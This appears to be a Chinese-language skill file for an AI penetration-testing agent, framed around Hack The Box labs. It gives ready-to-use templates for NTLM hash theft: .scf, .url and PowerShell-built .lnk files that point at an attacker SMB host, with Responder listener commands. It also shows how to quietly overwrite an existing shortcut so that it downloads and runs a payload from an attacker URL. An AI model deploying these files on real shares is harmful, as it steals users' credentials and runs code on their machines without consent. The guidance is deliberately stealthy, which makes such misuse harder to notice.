---
name: 'scf-ntlm-theft'
description: 'SCF/LNK/URL文件投放→NTLM hash窃取；LNK 第二种用法 TargetPath 改写→命令执行。HTB最常见"可写共享→凭据"路径。（检索词：scf/lnk/url/targetpath/ntlm/responder/theft）'
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## SCF / LNK / URL 文件 NTLM 窃取

> 🔴 **最常见的 HTB "可写共享→凭据" 路径**

### 原理
在可写 SMB 共享上放置特制的 `.scf`、`.lnk`、`.url` 文件。当用户（或服务）浏览该共享时，Windows 自动尝试连接文件中指定的图标/SMB 路径，触发 NTLM 认证 → Responder 捕获 NetNTLMv2 hash → 破解或中继。

### SCF 文件（最可靠）
```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\icon.ico
IconIndex=1
```
保存为 `@whatever.scf`（@ 确保排序在最前）。

### LNK 文件（PowerShell 生成）
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\path\to\shortcut.lnk")
$lnk.TargetPath = "\\<ATTACKER_IP>\share\file"
$lnk.IconLocation = "\\<ATTACKER_IP>\share\icon.ico"
$lnk.Save()
```

### 🔴 LNK 的第二种用法：改写 TargetPath → 命令执行（不只是偷 hash）

同一个 `WScript.Shell` 原语，**换个 TargetPath 就从"偷 hash"变成"代码执行"**。

**触发条件**：某个**可写目录**里的 `.lnk` 会被**高权限用户点击**（桌面、快捷方式目录、
`C:\Common Applications` 这类"常用工具"目录 —— 后者是 HTB 常见设计）。

```powershell
# 覆盖【已有的】.lnk —— 比新建更隐蔽：文件名和图标不变，用户不会察觉
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\Common Applications\Calculator.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments  = "Invoke-WebRequest -Uri http://ATTACKER/s.ps1 -OutFile C:\Windows\Temp\s.ps1; C:\Windows\Temp\s.ps1"
$Shortcut.Save()
# → 等目标用户点这个"计算器" → 拿到他的会话
```

**两种用法判别**：

| 目标 | TargetPath | 触发方式 | 结果 |
|------|-----------|---------|------|
| 偷 hash | `\\ATTACKER\share\file` | 浏览/预览目录即触发 | Responder 收 NetNTLMv2 |
| **代码执行** | `powershell.exe` + `Arguments=<payload>` | **需用户主动点击** | 完整会话 |

🔴 代码执行版**依赖用户交互**，所以先确认两件事：
1. 这个 `.lnk` 在**谁的常用路径**上（`dir C:\Users` 看有谁）
2. 目录**是否可写**（`icacls` / 直接 `$Shortcut.Save()` 试）

🎯 **HTB 上不需要真的有活人来点 —— 平台会【模拟用户点击】这类"常用工具"快捷方式。**
实测（Mist）：覆盖 `C:\Common Applications\Calculator.lnk` 后，payload 会被自动执行。

★ 所以**别因为"这台机器没有交互式登录用户"就放弃这条路** ——
  放好 payload、起好监听，然后**等**（可能要几分钟）。
★ 工程做法：payload 第一步先做一个**可观测的落点**（回连 / 写标记文件 / POST 到自己的 HTTP），
  用来确认"确实被点过了"，而不是靠猜。
★ 同类设计还有：HTB 会模拟点击桌面快捷方式、模拟打开共享里的 `.url`/`.scf`。

### URL 文件
```
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/file
IconFile=\\<ATTACKER_IP>\share\icon.ico
IconIndex=0
```
保存为 `@readme.url`。

### Kali 接收端
```bash
sudo responder -I tun0 -v
# 或
sudo impacket-smbserver -smb2support share /tmp/share
```

### 可投放位置
- 可写 SMB 共享（SYSVOL, NETLOGON, 自定义共享）
- WebDAV 可写目录
- 任何 Explorer 会自动预览的目录

### 常见场景
- 有 j.arbuckle → SYSVOL 可写 → 放 SCF → DC 管理员浏览 → 拿 Admin hash
- Printer 共享 → 放 SCF → IT 人员浏览 → 拿凭据

### 🔴 判断"值不值得部署后等"

LNK 劫持**依赖用户交互**，所以先判断"这台机器上会不会有人来点"：

```
[ ] dir C:\Users 看有没有【域用户的 profile】
    有 Brandon.Keywarp / Sharon.Mullard 这类目录
    ⇒ 这些域用户会登录这台机器 ⇒ 劫持后【持续监听】通常能等到
      （HTB 实例会模拟用户活动，WP 原话就是 "After a while, we receive a shell"）
[ ] 目录里只有本地账户（Administrator / svc_web / Public）
    ⇒ 没人会来点，别在这里耗时间，换别的路径
```

🔴 **部署后要真的等着，不是干等**：保持 nc 监听 + 隧道不断，同时并行做别的枚举。
**看到域用户 profile 就是强信号 —— 这条线值得挂上**。
